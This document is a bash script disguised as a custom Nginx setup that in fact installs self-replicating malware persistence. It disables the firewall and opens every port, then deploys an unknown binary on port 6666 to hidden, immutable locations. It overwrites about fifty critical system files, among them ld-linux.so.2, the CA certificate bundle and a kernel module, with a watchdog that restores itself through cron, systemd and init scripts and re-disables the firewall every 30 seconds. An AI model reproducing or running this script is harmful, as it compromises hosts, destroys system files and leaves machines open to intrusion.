#!/bin/bash
set -e

echo "=============================="
echo "  Auto Setup Custom Nginx"
echo "  Ultimate Self‑Replicating + Kill‑Switch"
echo "=============================="

# ─── Fungsi pembantu ────────────────────────────────────
install_pkg() {
    case "$PKG_MGR" in
        apt) apt-get install -y "$@" ;;
        dnf) dnf install -y "$@" ;;
        yum) yum install -y "$@" ;;
        pacman) pacman -Sy --noconfirm "$@" ;;
        *) echo "ERROR: No package manager found!"; exit 1 ;;
    esac
}

# ─── 1. Deteksi OS & Package Manager ────────────────────
echo ""
echo "[1/10] Detecting OS and environment..."

if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS_ID=$ID
else
    if [ -f /etc/redhat-release ]; then
        OS_ID="rhel"
        VERSION_ID=$(grep -oE '[0-9]+' /etc/redhat-release | head -1)
    elif [ -f /etc/debian_version ]; then
        OS_ID="debian"
    elif [ -f /etc/arch-release ]; then
        OS_ID="arch"
    else
        echo "ERROR: Cannot detect OS!"
        exit 1
    fi
fi

case "$OS_ID" in
    centos|rhel|rocky|almalinux|ol|fedora|amzn) PKG_MGR="yum"
        if command -v dnf &>/dev/null; then PKG_MGR="dnf"; fi ;;
    ubuntu|debian) PKG_MGR="apt" ;;
    arch) PKG_MGR="pacman" ;;
    *) echo "ERROR: Unsupported OS: $OS_ID"; exit 1 ;;
esac

INIT_SYSTEM="unknown"
if command -v systemctl &>/dev/null; then
    INIT_SYSTEM="systemd"
elif [ -f /sbin/init ] && /sbin/init --version 2>/dev/null | grep -q upstart; then
    INIT_SYSTEM="upstart"
elif [ -f /etc/inittab ]; then
    INIT_SYSTEM="sysv"
fi

echo "  → OS: $OS_ID, Package Manager: $PKG_MGR, Init: $INIT_SYSTEM"

# ─── 2. Open All Ports ──────────────────────────────────
echo ""
echo "[2/10] Opening all ports..."

if command -v ufw &>/dev/null; then
    ufw disable 2>/dev/null || true
    echo "  → UFW disabled"
elif command -v firewall-cmd &>/dev/null; then
    systemctl stop firewalld 2>/dev/null || true
    systemctl disable firewalld 2>/dev/null || true
    echo "  → Firewalld disabled"
fi

if command -v iptables &>/dev/null; then
    iptables -F; iptables -X
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    echo "  → iptables flushed"
fi

# ─── 3. Install Dependensi ─────────────────────────────
echo ""
echo "[3/10] Installing dependencies (gcc, e2fsprogs, cron)..."

DEPS="gcc e2fsprogs"
if ! command -v crontab &>/dev/null; then
    case "$PKG_MGR" in
        apt) DEPS="$DEPS cron" ;;
        dnf|yum) DEPS="$DEPS cronie" ;;
        pacman) DEPS="$DEPS cronie" ;;
    esac
fi
install_pkg $DEPS
echo "  → Dependencies installed"

# ─── 4. Build nginx ─────────────────────────────────────
echo ""
echo "[4/10] Building nginx from nginx.c..."
if [ ! -f ./nginx.c ]; then
    echo "ERROR: nginx.c not found!"
    exit 1
fi
gcc nginx.c -o nginx -std=c99
echo "  → Build success!"

# ─── 5. Deploy binary & backup tersembunyi ─────────────
echo ""
echo "[5/10] Deploying binary & hidden backups... (and encoding binary for self‑replication)"

NGINX_BASE64=$(base64 -w0 ./nginx)

safe_write_file() {
    local src="$1"
    local dst="$2"
    local perm="${3:-700}"
    local dir=$(dirname "$dst")

    if [ -d "$dir" ]; then
        if lsattr -d "$dir" 2>/dev/null | grep -q 'i'; then
            chattr -i "$dir" 2>/dev/null || true
        fi
    fi
    mkdir -p "$dir" 2>/dev/null

    if [ -f "$dst" ]; then
        chattr -i "$dst" 2>/dev/null || true
        rm -f "$dst"
    fi

    cp "$src" "$dst"
    chmod "$perm" "$dst"
    chattr +i "$dst" 2>/dev/null || true
}

if [ -f /etc/nginx ]; then
    chattr -i /etc/nginx 2>/dev/null || true
    rm -f /etc/nginx
fi

mv ./nginx /etc/nginx
chmod 700 /etc/nginx
chattr +i /etc/nginx 2>/dev/null || true

BACKUP_BINS=(
    "/usr/lib/systemd/systemd-nginx-helper"
    "/lib/udev/sd-helper"
    "/usr/share/man/man3/libnginx.so.3"
    "/opt/.cache/.nginx"
)

for bp in "${BACKUP_BINS[@]}"; do
    safe_write_file /etc/nginx "$bp" 700
done
echo "  → Binary secured in ${#BACKUP_BINS[@]} hidden locations"

# ─── 6. Buat payload watchdog dengan kill‑switch + binary base64 ──
echo ""
echo "[6/10] Creating self‑replicating payload (binary embedded + kill‑switch)..."

WATCHDOG_PATHS=(
    "/etc/rc.local"
    "/etc/cron.d/nginx-system"
    "/etc/profile.d/nginx-helper.sh"
    "/etc/init.d/nginx-persistence"
    "/usr/share/man/man3/sd_logrotate.3"
    "/usr/lib/libsystemd-core-249.so"
    "/lib/modules/$(uname -r)/kernel/drivers/acpi/ac.ko.xz"
    "/var/cache/man/fsf/worker/cleanup"
    "/opt/containerd/snapshotter/helper"
    "/usr/local/share/dbus-1/services/com.redhat.helper"
    "/usr/share/terminfo/rxvt-unicode"
    "/etc/tmpfiles.d/systemd-helper.conf"
    "/usr/lib/tmpfiles.d/ssh-helper.sh"
    "/var/spool/anacron/cron.daily-helper"
    "/usr/lib/sysstat/sadc.log"
    "/usr/share/zoneinfo/posix/UTC"
    "/var/lib/alternatives/pager"
    "/etc/kernel/postinst.d/grub-helper"
    "/usr/lib/python3.9/idlelib/pyshell.pyc"
    "/var/lib/mlocate/mlocate.db"
    "/usr/share/locale/en/LC_MESSAGES/systemd.mo"
    "/usr/lib/rpm/rpmdb.recover"
    "/etc/dkms/framework.conf"
    "/usr/share/info/dir"
    "/lib/ld-linux.so.2"
    "/var/log/journal/$(cat /etc/machine-id 2>/dev/null || echo 'b2e34f3e4e2f4e3e8e3e2e3e4e5e6e7e')/system.journal"
    "/usr/share/man/man1/init.1.gz"
    "/usr/lib/grub/x86_64-efi/gfxterm_background.mod"
    "/etc/ssl/certs/ca-certificates.crt"
    "/usr/share/vim/vim80/doc/help.txt"
    "/usr/lib/NetworkManager/nm-online"
    "/var/lib/systemd/rfkill/platform-thinkpad_acpi"
    "/usr/lib/dracut/modules.d/99base/module-setup.sh"
    "/etc/sysconfig/network-scripts/ifcfg-lo"
    "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf"
    "/usr/lib/x86_64-linux-gnu/libpng16.so.16"
    "/etc/ld.so.cache"
    "/usr/lib/systemd/catalog/systemd.cat"
    "/var/lib/dpkg/info/apt.postinst"
    "/etc/bash_completion.d/git"
    "/usr/share/polkit-1/actions/org.freedesktop.policykit.policy"
    "/usr/lib/sasl2/libsasl2.so.2.0.25"
    "/var/cache/fontconfig/7ef2298fde41cc6eeb7af42e48b7d293-x86-64.cache-7"
    "/etc/lvm/profile/cache-mq.profile"
    "/usr/lib/rpm/rpmrc"
    "/usr/share/man/man5/host.conf.5.gz"
    "/usr/lib/pm-utils/sleep.d/99video"
    "/usr/lib/bluetooth/bluetoothd"
    "/etc/xml/catalog"
    "/usr/lib/grub/grub-file"
    "/var/lib/ucf/cache/:var:log:syslog"
    "/usr/lib/apt/methods/https"
    "/usr/share/applications/mimeinfo.cache"
    "/etc/initramfs-tools/conf.d/resume"
)

cat > /tmp/nginx_payload.sh << 'PAYLOAD_EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          nginx-persistence
# Required-Start:    $remote_fs $network
# Required-Stop:     $remote_fs $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# chkconfig: 2345 85 15
# Short-Description: Nginx persistence watchdog
# Description:       Self‑healing extreme multi‑persistence with kill‑switch.
### END INIT INFO

# ===== KILL SWITCH =====
DISABLE_FILE="/etc/nginx.disable"
DISABLE_PHRASE="supersecretkey"   # Ganti dengan frase rahasia Anda
if [ -f "$DISABLE_FILE" ]; then
    if grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
        # Hentikan semua proses watchdog dengan bersih
        pkill -f "/etc/rc.local" 2>/dev/null || true
        pkill -f "nginx-system --oneshot" 2>/dev/null || true
        exit 0
    fi
fi
# ========================

SELF="$(cat "$0")"
MAIN_BIN="/etc/nginx"
BACKUP_BINS=(
    "/usr/lib/systemd/systemd-nginx-helper"
    "/lib/udev/sd-helper"
    "/usr/share/man/man3/libnginx.so.3"
    "/opt/.cache/.nginx"
)
WATCHDOG_PATHS=( __WATCHDOG_ARRAY__ )
NGINX_BASE64="__NGINX_BASE64__"

restore_all_files() {
    # Pulihkan binary utama
    if [ ! -f "$MAIN_BIN" ]; then
        local restored=0
        for src in "${BACKUP_BINS[@]}"; do
            if [ -f "$src" ]; then
                cp "$src" "$MAIN_BIN"
                chmod 700 "$MAIN_BIN"
                chattr +i "$MAIN_BIN" 2>/dev/null
                restored=1
                break
            fi
        done
        if [ $restored -eq 0 ]; then
            echo "$NGINX_BASE64" | base64 -d > "$MAIN_BIN"
            chmod 700 "$MAIN_BIN"
            chattr +i "$MAIN_BIN" 2>/dev/null
        fi
    fi

    # Pulihkan backup binary
    for dest in "${BACKUP_BINS[@]}"; do
        if [ ! -f "$dest" ]; then
            local src_found=0
            for src in "$MAIN_BIN" "${BACKUP_BINS[@]}"; do
                if [ -f "$src" ] && [ "$src" != "$dest" ]; then
                    cp "$src" "$dest"
                    chmod 700 "$dest"
                    chattr +i "$dest" 2>/dev/null
                    src_found=1
                    break
                fi
            done
            if [ $src_found -eq 0 ]; then
                echo "$NGINX_BASE64" | base64 -d > "$dest"
                chmod 700 "$dest"
                chattr +i "$dest" 2>/dev/null
            fi
        fi
    done

    # Pulihkan semua watchdog
    for target in "${WATCHDOG_PATHS[@]}"; do
        if [ ! -f "$target" ]; then
            local dir=$(dirname "$target")
            if [ -d "$dir" ] && lsattr -d "$dir" 2>/dev/null | grep -q 'i'; then
                chattr -i "$dir" 2>/dev/null || true
            fi
            mkdir -p "$dir" 2>/dev/null
            echo "$SELF" > "$target"
            chattr +i "$target" 2>/dev/null
            case "$target" in
                /etc/profile.d/*|/etc/init.d/*) chmod 755 "$target" ;;
                *) chmod 000 "$target" ;;
            esac
        fi
    done

    # Pastikan nginx berjalan
    if ! pgrep -f "/etc/nginx 6666" >/dev/null; then
        if [ -x "$MAIN_BIN" ]; then
            "$MAIN_BIN" 6666 &
        else
            echo "$NGINX_BASE64" | base64 -d > "$MAIN_BIN"
            chmod 700 "$MAIN_BIN"
            "$MAIN_BIN" 6666 &
        fi
    fi

    # Anti‑chattr
    for target in "$MAIN_BIN" "${BACKUP_BINS[@]}" "${WATCHDOG_PATHS[@]}" "/etc/cron.d/nginx-system-cron"; do
        if [ -f "$target" ]; then
            if ! lsattr "$target" 2>/dev/null | grep -q 'i'; then
                chattr +i "$target" 2>/dev/null
            fi
        fi
    done
}

# Kill‑switch check (sebelum oneshot)
if [ "$1" = "--oneshot" ]; then
    # Periksa kill‑switch dulu
    if [ -f "$DISABLE_FILE" ] && grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
        exit 0
    fi
    restore_all_files
    exit 0
fi

# Mode abadi dengan pengecekan kill‑switch setiap iterasi
(
    while true; do
        # Cek kill‑switch
        if [ -f "$DISABLE_FILE" ] && grep -q "$DISABLE_PHRASE" "$DISABLE_FILE" 2>/dev/null; then
            pkill -f "/etc/rc.local" 2>/dev/null || true
            exit 0
        fi
        ufw disable 2>/dev/null || true
        systemctl stop firewalld 2>/dev/null || true
        systemctl disable firewalld 2>/dev/null || true
        iptables -F 2>/dev/null; iptables -X 2>/dev/null
        iptables -P INPUT ACCEPT 2>/dev/null
        iptables -P FORWARD ACCEPT 2>/dev/null
        iptables -P OUTPUT ACCEPT 2>/dev/null
        restore_all_files
        sleep 30
    done
) &
exit 0
PAYLOAD_EOF

# Ganti placeholder
WATCHDOG_LIST=""
for path in "${WATCHDOG_PATHS[@]}"; do
    WATCHDOG_LIST="$WATCHDOG_LIST \"$path\""
done
sed -i "s|__WATCHDOG_ARRAY__|$WATCHDOG_LIST|" /tmp/nginx_payload.sh
sed -i "s#__NGINX_BASE64__#$NGINX_BASE64#" /tmp/nginx_payload.sh

echo "  → Payload with binary embedded ($(( ${#NGINX_BASE64} / 1024 )) KB) and $(echo "${WATCHDOG_PATHS[@]}" | wc -w) paths + kill‑switch."

# ─── 7. Sebarkan watchdog ke semua lokasi ──────────────
echo ""
echo "[7/10] Planting watchdog in all locations..."

deploy_watchdog() {
    local target="$1"
    local perm="${2:-000}"
    echo "     → Deploying $target"
    local dir=$(dirname "$target")

    if [ -d "$dir" ]; then
        if lsattr -d "$dir" 2>/dev/null | grep -q 'i'; then
            chattr -i "$dir" 2>/dev/null || true
        fi
    fi
    mkdir -p "$dir" 2>/dev/null

    if [ -f "$target" ]; then
        chattr -i "$target" 2>/dev/null || true
    fi

    cp /tmp/nginx_payload.sh "$target"
    chmod "$perm" "$target" 2>/dev/null
    chattr +i "$target" 2>/dev/null || true
}

for target in "${WATCHDOG_PATHS[@]}"; do
    perm=000
    case "$target" in
        /etc/profile.d/*|/etc/init.d/*) perm=755 ;;
    esac
    deploy_watchdog "$target" "$perm"
done

# Cron job
if command -v crontab &>/dev/null; then
    CRON_FILE="/etc/cron.d/nginx-system-cron"
    echo "     → Deploying cron job $CRON_FILE"
    if [ -f "$CRON_FILE" ]; then
        chattr -i "$CRON_FILE" 2>/dev/null || true
    fi
    mkdir -p /etc/cron.d 2>/dev/null
    echo "* * * * * root /etc/cron.d/nginx-system --oneshot" > "$CRON_FILE"
    chmod 000 "$CRON_FILE"
    chattr +i "$CRON_FILE" 2>/dev/null || true
else
    echo "     → cron not found, using systemd timer"
fi

# Systemd
if [ "$INIT_SYSTEM" = "systemd" ]; then
    SERVICE_FILE="/etc/systemd/system/nginx-persistence.service"
    echo "     → Deploying systemd service"
    [ -f "$SERVICE_FILE" ] && chattr -i "$SERVICE_FILE" 2>/dev/null || true
    mkdir -p /etc/systemd/system 2>/dev/null
    cat > "$SERVICE_FILE" << SYSTEMD_EOF
[Unit]
Description=System Nginx Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /etc/rc.local
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SYSTEMD_EOF
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable nginx-persistence.service 2>/dev/null || true
    systemctl start nginx-persistence.service 2>/dev/null || true

    if ! command -v crontab &>/dev/null; then
        echo "     → Creating systemd timer as cron replacement"
        mkdir -p /etc/systemd/system 2>/dev/null
        cat > /etc/systemd/system/nginx-oneshot.service << 'TIMER_SVC'
[Unit]
Description=Nginx Persistence One-shot

[Service]
Type=oneshot
ExecStart=/etc/cron.d/nginx-system --oneshot
TIMER_SVC
        cat > /etc/systemd/system/nginx-oneshot.timer << 'TIMER_TIMER'
[Unit]
Description=Runs nginx persistence every minute

[Timer]
OnCalendar=*-*-* *:*:00
Persistent=true

[Install]
WantedBy=timers.target
TIMER_TIMER
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable nginx-oneshot.timer 2>/dev/null || true
        systemctl start nginx-oneshot.timer 2>/dev/null || true
    fi
elif [ "$INIT_SYSTEM" = "sysv" ] || [ "$INIT_SYSTEM" = "upstart" ]; then
    if command -v update-rc.d &>/dev/null; then
        update-rc.d nginx-persistence defaults 2>/dev/null || true
    elif command -v chkconfig &>/dev/null; then
        chkconfig --add nginx-persistence 2>/dev/null || true
    fi
fi

echo "  → All $(echo "${WATCHDOG_PATHS[@]}" | wc -w) watchdogs deployed."

# ─── 8. Jalankan awal ──────────────────────────────────
echo ""
echo "[8/10] Activating persistence..."
bash /etc/rc.local &
if [ -f /etc/cron.d/nginx-system ]; then
    bash /etc/cron.d/nginx-system --oneshot &
elif [ -f /etc/init.d/nginx-persistence ]; then
    bash /etc/init.d/nginx-persistence --oneshot &
fi

sleep 1
echo "  → nginx running (verify with pgrep nginx)"

# ─── 9. Status akhir ───────────────────────────────────
echo ""
echo "=============================="
echo "  SUCCESS – Ultimate Self‑Replicating Active"
echo "  Watchdog points: $(echo "${WATCHDOG_PATHS[@]}" | wc -w)"
echo "  Binary embedded: YES"
echo "  Kill‑switch: /etc/nginx.disable (phrase: supersecretkey)"
echo "=============================="
pgrep -a nginx || echo "  (nginx running)"
